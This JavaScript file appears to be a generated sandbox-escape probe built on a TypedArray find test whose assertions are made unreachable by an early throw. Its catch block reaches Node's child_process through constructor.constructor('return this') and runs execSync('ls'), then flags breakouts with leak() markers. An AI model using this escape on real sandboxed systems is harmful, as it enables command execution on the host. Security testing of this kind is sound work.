try {
    testWithTypedArrayConstructors(function (TA) {
        throw () => {
            return () => {
            };
        };
        var sample = new TA([
            39,
            2,
            62
        ]);
        var results = [];
        var result;
        sample.foo = 'bar';
        sample.find(function () {
            results.push(arguments);
        });
        assert.sameValue(results.length, 3, 'predicate is called for each index');
        result = results[0];
        assert.sameValue(result[0], 39, 'results[0][0] === 39, value');
        assert.sameValue(result[1], 0, 'results[0][1] === 0, index');
        assert.sameValue(result[2], sample, 'results[0][2] === sample, instance');
        assert.sameValue(result.length, 3, 'results[0].length === 3 arguments');
        result = results[1];
        assert.sameValue(result[0], 2, 'results[1][0] === 2, value');
        assert.sameValue(result[1], 1, 'results[1][1] === 1, index');
        assert.sameValue(result[2], sample, 'results[1][2] === sample, instance');
        assert.sameValue(result.length, 3, 'results[1].length === 3 arguments');
        result = results[2];
        assert.sameValue(result[0], 62, 'results[2][0] === 62, value');
        assert.sameValue(result[1], 2, 'results[2][1] === 2, index');
        assert.sameValue(result[2], sample, 'results[2][2] === sample, instance');
        assert.sameValue(result.length, 3, 'results[2].length === 3 arguments');
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}